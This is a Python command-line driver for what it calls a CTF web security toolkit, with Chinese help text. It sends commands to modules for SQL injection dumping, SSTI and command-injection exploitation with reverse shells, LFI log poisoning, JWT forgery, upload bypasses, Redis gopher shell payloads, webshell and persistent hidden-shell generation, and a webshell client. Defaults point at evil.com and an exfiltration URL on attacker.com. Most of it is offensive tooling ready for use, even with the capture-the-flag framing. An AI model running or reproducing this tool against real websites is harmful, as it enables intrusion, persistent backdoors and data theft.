#!/usr/bin/env python3
"""
CTF Web Security Toolkit
Usage: python main.py <command> [options]

Commands:
  scan      - 全站漏洞快速扫描
  sqli      - SQL 注入利用
  xss       - XSS 检测
  ssrf      - SSRF 检测
  ssti      - SSTI 检测与利用
  lfi       - LFI/路径穿越
  cmdi      - 命令注入
  jwt       - JWT 分析与攻击
  xxe       - XXE 注入检测与利用
  nosqli    - NoSQL 注入 (MongoDB/Redis)
  redirect  - Open Redirect 扫描
  audit     - 安全防御审计
  cors      - CORS 错误配置检测
  encode    - 编解码工具箱
  upload    - 文件上传绕过
  webshell  - Webshell 生成
  immortal  - 不死马生成
  shell     - 连接 Webshell
"""

import argparse
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.requester import Requester
from core.utils import (banner, ok, info, warn, err, section,
                        b64_encode, b64_decode, url_encode, url_decode,
                        hex_encode, hex_decode, md5, sha1, sha256, rot13,
                        extract_flags, load_wordlist)

from offensive.sqli import (quick_scan as sqli_quick, error_based_detect,
                             error_based_dump, BooleanBlind, TimeBlind)
from offensive.xss import XSSScanner, analyze_dom_xss, generate_payloads
from offensive.ssrf import SSRFScanner
from offensive.ssti import SSTIScanner
from offensive.lfi import LFIScanner
from offensive.cmd_injection import CMDInjectionScanner
from offensive.jwt_attack import (parse_jwt, print_jwt, attack_alg_none,
                                   brute_force_secret, forge_with_secret,
                                   attack_kid_injection)
from defensive.analyzer import SecurityAnalyzer
from offensive.upload import UploadScanner
from offensive.webshell import generate as ws_generate, list_shells, PHPShell
from offensive.immortal_shell import generate as im_generate, show_kill_tips, IMMORTAL_TYPES
from offensive.shell_client import connect as shell_connect, BehinderClient
from offensive.xxe import XXEScanner
from offensive.nosqli import MongoInjection, RedisInjection
from offensive.open_redirect import OpenRedirectScanner
from defensive.cors_checker import CORSChecker


def make_requester(args) -> Requester:
    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    if hasattr(args, "header") and args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    return Requester(
        proxy=getattr(args, "proxy", None),
        cookies=cookies,
        headers=headers,
        timeout=getattr(args, "timeout", 10),
    )


# ════════════════════════════════════════════
#  scan 命令 - 全站快速扫描
# ════════════════════════════════════════════
def cmd_scan(args):
    req = make_requester(args)
    params = args.params.split(",") if args.params else ["id", "q", "search", "page", "url", "file"]
    method = args.method.upper()

    section(f"快速漏洞扫描: {args.url}")
    info(f"参数: {params}  方法: {method}")

    # SQL 注入
    sqli_result = sqli_quick(req, args.url, params, method)

    # XSS
    scanner = XSSScanner(req)
    for p in params:
        scanner.probe_reflection(args.url, p, method)

    # SSTI
    ssti = SSTIScanner(req)
    for p in params:
        ssti.detect(args.url, p, method)

    # LFI
    lfi = LFIScanner(req)
    for p in params:
        lfi.detect(args.url, p, method)

    # CMDI
    cmdi = CMDInjectionScanner(req)
    for p in params:
        cmdi.detect_echo(args.url, p, method)

    # 安全审计
    analyzer = SecurityAnalyzer(req)
    analyzer.detect_waf(args.url)
    analyzer.scan_info_leak(args.url)


# ════════════════════════════════════════════
#  sqli 命令
# ════════════════════════════════════════════
def cmd_sqli(args):
    req = make_requester(args)
    method = args.method.upper()

    if args.action == "detect":
        error_based_detect(req, args.url, args.param, method)

    elif args.action == "dump":
        expr = args.expr or "database()"
        result = error_based_dump(req, args.url, args.param, expr, method)
        if result:
            ok(f"结果: {result}")

    elif args.action == "bool":
        blind = BooleanBlind(req, args.url, args.param, method=method)
        if blind.calibrate():
            if args.expr:
                blind.extract_string(args.expr)
            else:
                db = blind.dump_database()
                if db:
                    tables = blind.dump_tables(db)
                    ok(f"Tables: {tables}")
        else:
            err("布尔盲注校准失败，无明显差异")

    elif args.action == "time":
        blind = TimeBlind(req, args.url, args.param,
                          sleep_sec=args.sleep, method=method)
        if blind.detect():
            if args.expr:
                blind.extract_string(args.expr)

    elif args.action == "quick":
        params = args.param.split(",") if args.param else ["id", "q"]
        sqli_quick(req, args.url, params, method)


# ════════════════════════════════════════════
#  xss 命令
# ════════════════════════════════════════════
def cmd_xss(args):
    req = make_requester(args)
    scanner = XSSScanner(req)
    method = args.method.upper()

    if args.action == "probe":
        scanner.probe_reflection(args.url, args.param, method)
    elif args.action == "scan":
        scanner.scan_payloads(args.url, args.param, method=method)
    elif args.action == "csp":
        scanner.analyze_csp(args.url)
    elif args.action == "dom":
        resp = req.get(args.url)
        if resp:
            analyze_dom_xss(resp.text)
    elif args.action == "gen":
        ctx = args.context or "html_content"
        payloads = generate_payloads(ctx)
        for p in payloads:
            print(f"  {p}")


# ════════════════════════════════════════════
#  ssrf 命令
# ════════════════════════════════════════════
def cmd_ssrf(args):
    req = make_requester(args)
    scanner = SSRFScanner(req)
    method = args.method.upper()

    if args.action == "detect":
        scanner.detect_basic(args.url, args.param, method)
    elif args.action == "file":
        scanner.detect_file_read(args.url, args.param, method)
    elif args.action == "ports":
        host = args.target or "127.0.0.1"
        scanner.probe_ports(args.url, args.param, host, method=method)
    elif args.action == "cloud":
        cloud = args.cloud or "aws"
        scanner.probe_cloud_metadata(args.url, args.param, cloud, method)
    elif args.action == "bypass":
        scanner.test_bypass(args.url, args.param, method)
    elif args.action == "redis":
        if not args.lhost or not args.lport:
            err("需要 --lhost 和 --lport")
            return
        payload = scanner.generate_redis_shell(args.lhost, args.lport)
        ok(f"Redis Gopher Payload:\n{payload}")


# ════════════════════════════════════════════
#  ssti 命令
# ════════════════════════════════════════════
def cmd_ssti(args):
    req = make_requester(args)
    scanner = SSTIScanner(req)
    method = args.method.upper()

    if args.action == "detect":
        engine = scanner.detect(args.url, args.param, method)
        if engine:
            ok(f"引擎: {engine}")

    elif args.action == "exploit":
        cmd = args.cmd or "id"
        engine = args.engine
        if not engine:
            engine = scanner.detect(args.url, args.param, method)
        if engine == "jinja2":
            scanner.exploit_jinja2(args.url, args.param, cmd, method)
        elif engine == "twig":
            scanner.exploit_twig(args.url, args.param, cmd, method)
        elif engine == "freemarker":
            scanner.exploit_freemarker(args.url, args.param, cmd, method)
        elif engine == "velocity":
            scanner.exploit_velocity(args.url, args.param, cmd, method)
        elif engine == "smarty":
            scanner.exploit_smarty(args.url, args.param, cmd, method)
        elif engine == "mako":
            scanner.exploit_mako(args.url, args.param, cmd, method)
        else:
            warn(f"未知或未支持的引擎: {engine}")

    elif args.action == "classes":
        classes = scanner.dump_jinja2_subclasses(args.url, args.param, method)
        for i, c in enumerate(classes):
            print(f"  [{i}] {c}")


# ════════════════════════════════════════════
#  lfi 命令
# ════════════════════════════════════════════
def cmd_lfi(args):
    req = make_requester(args)
    scanner = LFIScanner(req)
    method = args.method.upper()

    if args.action == "detect":
        scanner.detect(args.url, args.param, method)
    elif args.action == "read":
        filepath = args.file or "/etc/passwd"
        content = scanner.read_file(args.url, args.param, filepath, method)
        if content:
            print(content[:2000])
    elif args.action == "filter":
        filepath = args.file or "index.php"
        content = scanner.php_filter_read(args.url, args.param, filepath, method)
        if content:
            print(content[:3000])
    elif args.action == "scan":
        os_type = args.os or "linux"
        scanner.scan_sensitive(args.url, args.param, os_type, method)
    elif args.action == "log":
        log = args.file or "/var/log/nginx/access.log"
        cmd = args.cmd or "id"
        scanner.log_poison(args.url, args.param, log, cmd, method)


# ════════════════════════════════════════════
#  cmdi 命令
# ════════════════════════════════════════════
def cmd_cmdi(args):
    req = make_requester(args)
    scanner = CMDInjectionScanner(req)
    method = args.method.upper()

    if args.action == "detect":
        scanner.detect_echo(args.url, args.param, method)
    elif args.action == "time":
        scanner.detect_time(args.url, args.param, method=method)
    elif args.action == "exec":
        cmd = args.cmd or "id"
        output = scanner.execute(args.url, args.param, cmd, method)
        if output:
            print(output)
    elif args.action == "recon":
        scanner.recon(args.url, args.param, method)
    elif args.action == "shell":
        if not args.lhost or not args.lport:
            err("需要 --lhost 和 --lport")
            return
        scanner.reverse_shell(args.url, args.param,
                              args.lhost, int(args.lport), method)
    elif args.action == "bypass":
        scanner.test_bypass(args.url, args.param, method)


# ════════════════════════════════════════════
#  jwt 命令
# ════════════════════════════════════════════
def cmd_jwt(args):
    if args.action == "parse":
        print_jwt(args.token)

    elif args.action == "none":
        tokens = attack_alg_none(args.token)
        section("生成的 alg=none Token")
        for t in tokens:
            print(f"  {t}")

    elif args.action == "brute":
        wordlist = load_wordlist(args.wordlist) if args.wordlist else None
        secret = brute_force_secret(args.token, wordlist)
        if secret:
            ok(f"密钥: {secret!r}")

    elif args.action == "forge":
        if not args.secret:
            err("需要 --secret")
            return
        import json
        claims = json.loads(args.claims) if args.claims else {}
        forged = forge_with_secret(args.token, args.secret, claims)
        print(f"\n  {forged}\n")

    elif args.action == "kid":
        payload = args.kid_payload or "' UNION SELECT 'secret'--"
        secret = args.secret or "secret"
        forged = attack_kid_injection(args.token, secret, payload)
        print(f"\n  {forged}\n")


# ════════════════════════════════════════════
#  audit 命令
# ════════════════════════════════════════════
def cmd_audit(args):
    req = make_requester(args)
    analyzer = SecurityAnalyzer(req)

    if args.action == "headers":
        analyzer.analyze_headers(args.url)
    elif args.action == "waf":
        analyzer.detect_waf(args.url)
    elif args.action == "leak":
        analyzer.scan_info_leak(args.url)
    elif args.action == "paths":
        analyzer.scan_common_paths(args.url)
    elif args.action == "full":
        analyzer.full_audit(args.url)


# ════════════════════════════════════════════
#  upload 命令 - 文件上传绕过
# ════════════════════════════════════════════
def cmd_upload(args):
    req = make_requester(args)
    scanner = UploadScanner(req)

    # 生成默认 shell 内容
    shell_code = PHPShell.basic(args.password).encode()
    if args.shell_file:
        try:
            with open(args.shell_file, "rb") as f:
                shell_code = f.read()
        except Exception as e:
            err(f"读取 shell 文件失败: {e}")
            return

    # 解析额外表单字段
    extra = {}
    if args.data:
        for item in args.data:
            if "=" in item:
                k, v = item.split("=", 1)
                extra[k] = v

    if args.action == "detect":
        scanner.detect_upload_field(args.url)

    elif args.action == "ext":
        scanner.try_extensions(args.url, args.param, shell_code,
                               extra_data=extra or None,
                               verify_url=args.verify or "")

    elif args.action == "mime":
        scanner.try_mime_bypass(args.url, args.param, shell_code,
                                filename=args.filename or "shell.php",
                                extra_data=extra or None)

    elif args.action == "magic":
        scanner.try_magic_bytes(args.url, args.param, shell_code,
                                filename=args.filename or "shell.php",
                                magic=args.magic or "gif",
                                extra_data=extra or None)

    elif args.action == "htaccess":
        scanner.upload_htaccess(args.url, args.param, extra_data=extra or None)

    elif args.action == "userini":
        scanner.upload_user_ini(args.url, args.param,
                                shell_filename=args.filename or "shell.jpg",
                                extra_data=extra or None)

    elif args.action == "race":
        if not args.shell_url:
            err("条件竞争需要 --shell-url 指定 shell 访问地址")
            return
        scanner.race_condition(args.url, args.param, shell_code,
                               filename=args.filename or "shell.php",
                               shell_url=args.shell_url,
                               threads=args.threads or 20,
                               extra_data=extra or None)

    elif args.action == "scan":
        scanner.scan_all(args.url, args.param, shell_code, extra_data=extra or None)


# ════════════════════════════════════════════
#  webshell 命令 - Webshell 生成
# ════════════════════════════════════════════
def cmd_webshell(args):
    if args.action == "list":
        list_shells()
        return
    ws_generate(
        shell_type=args.type or "php_basic",
        password=args.password or "cmd",
        output_path=args.output,
    )


# ════════════════════════════════════════════
#  immortal 命令 - 不死马生成
# ════════════════════════════════════════════
def cmd_immortal(args):
    if args.action == "list":
        from core.utils import section, info
        section("可用不死马类型")
        for t in IMMORTAL_TYPES:
            info(f"  {t}")
        return
    if args.action == "kill":
        show_kill_tips()
        return
    im_generate(
        shell_type=args.type or "fork",
        password=args.password or "cmd",
        shell_path=args.shell_path or "/var/www/html/.shell.php",
        output_path=args.output,
    )


# ════════════════════════════════════════════
#  shell 命令 - 连接 Webshell
# ════════════════════════════════════════════
def cmd_shell(args):
    if args.shell_type == "behinder":
        client = BehinderClient(args.url, args.password or "rebeyond",
                                proxy=getattr(args, "proxy", None))
    else:
        client = shell_connect(
            url=args.url,
            password=args.password or "cmd",
            shell_type=args.shell_type or "eval",
            method=args.method or "POST",
            proxy=getattr(args, "proxy", None),
            cookies=getattr(args, "cookie", ""),
        )

    if args.action == "info":
        client.get_info()
    elif args.action == "exec":
        if not args.cmd:
            err("需要 --cmd 参数")
            return
        output = client.execute(args.cmd)
        print(output)
    elif args.action == "read":
        if not args.file:
            err("需要 --file 参数")
            return
        print(client.read_file(args.file))
    elif args.action == "write":
        if not args.file or not args.cmd:
            err("需要 --file 和 --cmd（写入内容）")
            return
        client.write_file(args.file, args.cmd)
    elif args.action == "upload":
        if not args.local or not args.file:
            err("需要 --local（本地路径）和 --file（远程路径）")
            return
        client.upload_file(args.local, args.file)
    elif args.action == "download":
        if not args.file or not args.local:
            err("需要 --file（远程路径）和 --local（本地路径）")
            return
        client.download_file(args.file, args.local)
    elif args.action == "ls":
        client.list_dir(args.path or ".")
    elif args.action == "bypass":
        if not args.cmd:
            err("需要 --cmd")
            return
        client.bypass_disable_functions(args.cmd)
    elif args.action == "interactive":
        client.interactive()


# ════════════════════════════════════════════
#  xxe 命令 - XXE 注入
# ════════════════════════════════════════════
def cmd_xxe(args):
    req = make_requester(args)
    scanner = XXEScanner(req, callback_host=getattr(args, "oob", "") or "")
    method = args.method.upper()

    if args.action == "detect":
        scanner.detect(args.url, args.param or "", method)

    elif args.action == "read":
        filepath = args.file or "/etc/passwd"
        use_filter = getattr(args, "php_filter", False)
        content = scanner.read_file(args.url, filepath, args.param or "", method,
                                    use_php_filter=use_filter)
        if content:
            print(content[:3000])

    elif args.action == "scan":
        os_type = args.os or "linux"
        scanner.scan_files(args.url, args.param or "", method, os_type)

    elif args.action == "ssrf":
        scanner.ssrf_probe(args.url, args.param or "", method=method)

    elif args.action == "oob":
        filepath = args.file or "/etc/passwd"
        scanner.generate_oob_payloads(filepath)

    elif args.action == "gen":
        from offensive.xxe import (build_basic_xxe, build_svg_xxe,
                                    build_xinclude_xxe, build_php_filter_xxe)
        filepath = args.file or "/etc/passwd"
        gen_type = getattr(args, "gen_type", "basic") or "basic"
        if gen_type == "svg":
            print(build_svg_xxe(filepath))
        elif gen_type == "xinclude":
            print(build_xinclude_xxe(filepath))
        elif gen_type == "php":
            print(build_php_filter_xxe(filepath))
        else:
            print(build_basic_xxe(filepath))


# ════════════════════════════════════════════
#  nosqli 命令 - NoSQL 注入
# ════════════════════════════════════════════
def cmd_nosqli(args):
    req = make_requester(args)
    method = args.method.upper()

    if args.target_type == "redis":
        host = getattr(args, "rhost", "127.0.0.1") or "127.0.0.1"
        port = int(getattr(args, "rport", 6379) or 6379)
        if args.action == "webshell":
            payload = RedisInjection.webshell_payload(host, port)
            ok(f"Redis Webshell Gopher Payload:\n{payload}")
        elif args.action == "crontab":
            if not args.lhost or not args.lport:
                err("需要 --lhost 和 --lport")
                return
            payload = RedisInjection.crontab_payload(host, port, args.lhost, int(args.lport))
            ok(f"Redis Crontab Gopher Payload:\n{payload}")
        return

    # MongoDB
    scanner = MongoInjection(req)
    if args.action == "bypass":
        user_field = args.user_field or "username"
        pass_field = args.pass_field or "password"
        scanner.auth_bypass_json(args.url, user_field, pass_field)
        scanner.auth_bypass_param(args.url, user_field, pass_field)

    elif args.action == "detect":
        scanner.detect_injection(args.url, args.param, method)

    elif args.action == "extract":
        target_field = getattr(args, "target_field", "password") or "password"
        scanner.extract_field(args.url, args.param, target_field, method)

    elif args.action == "time":
        scanner.time_based_detect(args.url, args.param, method)


# ════════════════════════════════════════════
#  redirect 命令 - Open Redirect
# ════════════════════════════════════════════
def cmd_redirect(args):
    req = make_requester(args)
    scanner = OpenRedirectScanner(req, allow_redirect=False)
    method = args.method.upper()
    target = args.target or "https://evil.com"

    if args.action == "scan":
        scanner.scan_params(args.url, target, method)

    elif args.action == "bypass":
        if not args.param:
            err("需要 --param 指定参数名")
            return
        scanner.test_bypasses(args.url, args.param, target, method)

    elif args.action == "js":
        if not args.param:
            err("需要 --param 指定参数名")
            return
        scanner.test_javascript_proto(args.url, args.param, method)

    elif args.action == "detect":
        scanner.detect_from_page(args.url)


# ════════════════════════════════════════════
#  cors 命令 - CORS 错误配置检测
# ════════════════════════════════════════════
def cmd_cors(args):
    req = make_requester(args)
    checker = CORSChecker(req)
    method = args.method.upper()

    if args.action == "check":
        checker.check_origin_reflection(args.url, method)
        checker.check_null_origin(args.url, method)

    elif args.action == "null":
        checker.check_null_origin(args.url, method)

    elif args.action == "subdomain":
        domain = getattr(args, "domain", "") or ""
        if not domain:
            err("需要 --domain 指定目标域名")
            return
        checker.check_subdomain_bypass(args.url, domain, method)

    elif args.action == "full":
        domain = getattr(args, "domain", "") or ""
        checker.full_scan(args.url, domain, method)

    elif args.action == "poc":
        exfil = getattr(args, "exfil", "https://attacker.com/log") or "https://attacker.com/log"
        html = checker.generate_exploit_html(args.url, exfil)
        print(html)


def cmd_encode(args):
    data = args.data
    section("编解码工具")
    if args.action == "b64e":   print(b64_encode(data))
    elif args.action == "b64d": print(b64_decode(data))
    elif args.action == "urle": print(url_encode(data))
    elif args.action == "urld": print(url_decode(data))
    elif args.action == "hexe": print(hex_encode(data))
    elif args.action == "hexd": print(hex_decode(data))
    elif args.action == "md5":  print(md5(data))
    elif args.action == "sha1": print(sha1(data))
    elif args.action == "sha256": print(sha256(data))
    elif args.action == "rot13": print(rot13(data))
    elif args.action == "all":
        print(f"  Base64:   {b64_encode(data)}")
        print(f"  URL:      {url_encode(data)}")
        print(f"  Hex:      {hex_encode(data)}")
        print(f"  MD5:      {md5(data)}")
        print(f"  SHA1:     {sha1(data)}")
        print(f"  SHA256:   {sha256(data)}")
        print(f"  ROT13:    {rot13(data)}")


# ════════════════════════════════════════════
#  CLI 解析器
# ════════════════════════════════════════════
def build_parser():
    parser = argparse.ArgumentParser(
        description="CTF Web Security Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--proxy",   help="代理地址 (如 http://127.0.0.1:8080)")
    parser.add_argument("--cookie",  default="", help="Cookie 字符串 (name=val; name2=val2)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数")
    parser.add_argument("--header",  action="append", help="自定义请求头 (可多次使用)")

    sub = parser.add_subparsers(dest="command")

    # ── scan ──
    p = sub.add_parser("scan", help="全站快速扫描")
    p.add_argument("url")
    p.add_argument("--params", help="参数名，逗号分隔 (如 id,q,search)")
    p.add_argument("--method", default="GET", choices=["GET", "POST"])

    # ── sqli ──
    p = sub.add_parser("sqli", help="SQL 注入")
    p.add_argument("url")
    p.add_argument("--param", required=True, help="注入参数名")
    p.add_argument("--action", default="detect",
                   choices=["detect", "dump", "bool", "time", "quick"])
    p.add_argument("--method", default="GET", choices=["GET", "POST"])
    p.add_argument("--expr",   help="提取表达式，如 database()")
    p.add_argument("--sleep",  type=float, default=5.0, help="时间盲注延迟秒数")

    # ── xss ──
    p = sub.add_parser("xss", help="XSS 检测")
    p.add_argument("url")
    p.add_argument("--param",   help="检测参数")
    p.add_argument("--action",  default="probe",
                   choices=["probe", "scan", "csp", "dom", "gen"])
    p.add_argument("--method",  default="GET", choices=["GET", "POST"])
    p.add_argument("--context", help="生成 payload 的上下文 (html_content/attribute_value/js_string)")

    # ── ssrf ──
    p = sub.add_parser("ssrf", help="SSRF 检测")
    p.add_argument("url")
    p.add_argument("--param",  required=True, help="SSRF 参数名")
    p.add_argument("--action", default="detect",
                   choices=["detect", "file", "ports", "cloud", "bypass", "redis"])
    p.add_argument("--method", default="GET", choices=["GET", "POST"])
    p.add_argument("--target", help="探测的内网主机")
    p.add_argument("--cloud",  help="云厂商 (aws/gcp/aliyun/azure)")
    p.add_argument("--lhost",  help="反弹 shell 的监听 IP")
    p.add_argument("--lport",  type=int, help="反弹 shell 的监听端口")

    # ── ssti ──
    p = sub.add_parser("ssti", help="SSTI 检测与利用")
    p.add_argument("url")
    p.add_argument("--param",   required=True, help="SSTI 参数名")
    p.add_argument("--action",  default="detect",
                   choices=["detect", "exploit", "classes"])
    p.add_argument("--method",  default="GET", choices=["GET", "POST"])
    p.add_argument("--cmd",     help="执行的命令")
    p.add_argument("--engine",  help="指定引擎 (jinja2/twig/freemarker/velocity/smarty/mako)")

    # ── lfi ──
    p = sub.add_parser("lfi", help="LFI / 路径穿越")
    p.add_argument("url")
    p.add_argument("--param",  required=True, help="LFI 参数名")
    p.add_argument("--action", default="detect",
                   choices=["detect", "read", "filter", "scan", "log"])
    p.add_argument("--method", default="GET", choices=["GET", "POST"])
    p.add_argument("--file",   help="要读取的文件路径")
    p.add_argument("--os",     default="linux", choices=["linux", "windows"])
    p.add_argument("--cmd",    help="日志投毒执行的命令")

    # ── cmdi ──
    p = sub.add_parser("cmdi", help="命令注入")
    p.add_argument("url")
    p.add_argument("--param",  required=True, help="注入参数名")
    p.add_argument("--action", default="detect",
                   choices=["detect", "time", "exec", "recon", "shell", "bypass"])
    p.add_argument("--method", default="GET", choices=["GET", "POST"])
    p.add_argument("--cmd",    help="执行的命令")
    p.add_argument("--lhost",  help="反弹 shell 的监听 IP")
    p.add_argument("--lport",  help="反弹 shell 的监听端口")

    # ── jwt ──
    p = sub.add_parser("jwt", help="JWT 分析与攻击")
    p.add_argument("token", help="JWT Token 字符串")
    p.add_argument("--action", default="parse",
                   choices=["parse", "none", "brute", "forge", "kid"])
    p.add_argument("--secret",      help="已知密钥")
    p.add_argument("--claims",      help='伪造的 Claims JSON (如 \'{"admin":true}\')')
    p.add_argument("--wordlist",    help="爆破字典文件路径")
    p.add_argument("--kid-payload", dest="kid_payload", help="kid 注入 payload")

    # ── audit ──
    p = sub.add_parser("audit", help="安全防御审计")
    p.add_argument("url")
    p.add_argument("--action", default="full",
                   choices=["headers", "waf", "leak", "paths", "full"])

    # ── encode ──
    p = sub.add_parser("encode", help="编解码工具箱")
    p.add_argument("data", help="要处理的数据")
    p.add_argument("--action", default="all",
                   choices=["b64e", "b64d", "urle", "urld", "hexe", "hexd",
                            "md5", "sha1", "sha256", "rot13", "all"])

    # ── upload ──
    p = sub.add_parser("upload", help="文件上传绕过")
    p.add_argument("url", help="上传接口 URL")
    p.add_argument("--param",      default="file", help="文件表单字段名")
    p.add_argument("--action",     default="scan",
                   choices=["detect", "ext", "mime", "magic", "htaccess",
                            "userini", "race", "scan"])
    p.add_argument("--password",   default="cmd",  help="webshell 密码参数")
    p.add_argument("--shell-file", dest="shell_file", help="使用自定义 shell 文件")
    p.add_argument("--filename",   help="上传的文件名")
    p.add_argument("--magic",      default="gif",  help="魔术字节类型 (gif/jpg/png/pdf)")
    p.add_argument("--verify",     default="",     help="上传成功后校验路径前缀")
    p.add_argument("--shell-url",  dest="shell_url", help="条件竞争时 shell 的访问 URL")
    p.add_argument("--threads",    type=int, default=20, help="条件竞争并发线程数")
    p.add_argument("--data",       action="append", help="额外 POST 字段 key=value（可多次）")

    # ── webshell ──
    p = sub.add_parser("webshell", help="Webshell 生成")
    p.add_argument("--action",   default="gen",   choices=["gen", "list"])
    p.add_argument("--type",     default="php_basic", help="shell 类型（用 list 查看所有）")
    p.add_argument("--password", default="cmd",   help="webshell 密码参数名")
    p.add_argument("--output",   help="输出文件路径（不指定则打印到终端）")

    # ── immortal ──
    p = sub.add_parser("immortal", help="不死马生成")
    p.add_argument("--action",     default="gen",  choices=["gen", "list", "kill"])
    p.add_argument("--type",       default="fork", help="不死马类型（用 list 查看所有）")
    p.add_argument("--password",   default="cmd",  help="webshell 密码参数名")
    p.add_argument("--shell-path", dest="shell_path",
                   default="/var/www/html/.shell.php", help="不死马写入路径")
    p.add_argument("--output",     help="输出文件路径")

    # ── xxe ──
    p = sub.add_parser("xxe", help="XXE 注入检测与利用")
    p.add_argument("url")
    p.add_argument("--param",    default="", help="XML 参数名（为空则发送原始 XML body）")
    p.add_argument("--action",   default="detect",
                   choices=["detect", "read", "scan", "ssrf", "oob", "gen"])
    p.add_argument("--method",   default="POST", choices=["GET", "POST"])
    p.add_argument("--file",     help="要读取的文件路径（默认 /etc/passwd）")
    p.add_argument("--os",       default="linux", choices=["linux", "windows"])
    p.add_argument("--oob",      help="带外回调服务器地址（如 evil.com:8080）")
    p.add_argument("--gen-type", dest="gen_type", default="basic",
                   choices=["basic", "svg", "xinclude", "php"],
                   help="生成 Payload 类型")
    p.add_argument("--php-filter", dest="php_filter", action="store_true",
                   help="读取 PHP 文件时使用 php://filter base64 编码")

    # ── nosqli ──
    p = sub.add_parser("nosqli", help="NoSQL 注入 (MongoDB/Redis)")
    p.add_argument("url", nargs="?", default="")
    p.add_argument("--action",      default="bypass",
                   choices=["bypass", "detect", "extract", "time",
                             "webshell", "crontab"])
    p.add_argument("--type",        dest="target_type", default="mongo",
                   choices=["mongo", "redis"], help="目标数据库类型")
    p.add_argument("--method",      default="POST", choices=["GET", "POST"])
    p.add_argument("--param",       help="注入参数名")
    p.add_argument("--user-field",  dest="user_field", default="username")
    p.add_argument("--pass-field",  dest="pass_field", default="password")
    p.add_argument("--target-field", dest="target_field", default="password",
                   help="盲注提取的目标字段名")
    p.add_argument("--rhost",       default="127.0.0.1", help="Redis 主机")
    p.add_argument("--rport",       type=int, default=6379, help="Redis 端口")
    p.add_argument("--lhost",       help="反弹 Shell 监听 IP")
    p.add_argument("--lport",       help="反弹 Shell 监听端口")

    # ── redirect ──
    p = sub.add_parser("redirect", help="Open Redirect 扫描")
    p.add_argument("url")
    p.add_argument("--action",  default="scan",
                   choices=["scan", "bypass", "js", "detect"])
    p.add_argument("--method",  default="GET", choices=["GET", "POST"])
    p.add_argument("--param",   help="指定测试参数名")
    p.add_argument("--target",  default="https://evil.com",
                   help="重定向目标 URL（默认 https://evil.com）")

    # ── cors ──
    p = sub.add_parser("cors", help="CORS 错误配置检测")
    p.add_argument("url")
    p.add_argument("--action",  default="full",
                   choices=["check", "null", "subdomain", "full", "poc"])
    p.add_argument("--method",  default="GET", choices=["GET", "POST"])
    p.add_argument("--domain",  help="目标域名（用于子域名绕过测试，如 victim.com）")
    p.add_argument("--exfil",   default="https://attacker.com/log",
                   help="PoC 数据回传地址")

    # ── shell ──
    p = sub.add_parser("shell", help="连接 Webshell")
    p.add_argument("url", help="Webshell URL")
    p.add_argument("--action",     default="interactive",
                   choices=["interactive", "info", "exec", "read", "write",
                            "upload", "download", "ls", "bypass"])
    p.add_argument("--shell-type", dest="shell_type", default="eval",
                   choices=["eval", "system", "behinder"],
                   help="shell 通信协议类型")
    p.add_argument("--password",   default="cmd",  help="webshell 密码参数名")
    p.add_argument("--method",     default="POST", choices=["GET", "POST"])
    p.add_argument("--cmd",        help="执行的命令 / 写入内容")
    p.add_argument("--file",       help="远程文件路径")
    p.add_argument("--local",      help="本地文件路径（upload/download）")
    p.add_argument("--path",       help="列目录路径")

    return parser


def main():
    banner()
    parser = build_parser()
    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    dispatch = {
        "scan":     cmd_scan,
        "sqli":     cmd_sqli,
        "xss":      cmd_xss,
        "ssrf":     cmd_ssrf,
        "ssti":     cmd_ssti,
        "lfi":      cmd_lfi,
        "cmdi":     cmd_cmdi,
        "jwt":      cmd_jwt,
        "audit":    cmd_audit,
        "encode":   cmd_encode,
        "upload":   cmd_upload,
        "webshell": cmd_webshell,
        "immortal": cmd_immortal,
        "shell":    cmd_shell,
        "xxe":      cmd_xxe,
        "nosqli":   cmd_nosqli,
        "redirect": cmd_redirect,
        "cors":     cmd_cors,
    }

    try:
        dispatch[args.command](args)
    except KeyboardInterrupt:
        warn("\n用户中断")
    except Exception as e:
        err(f"执行出错: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
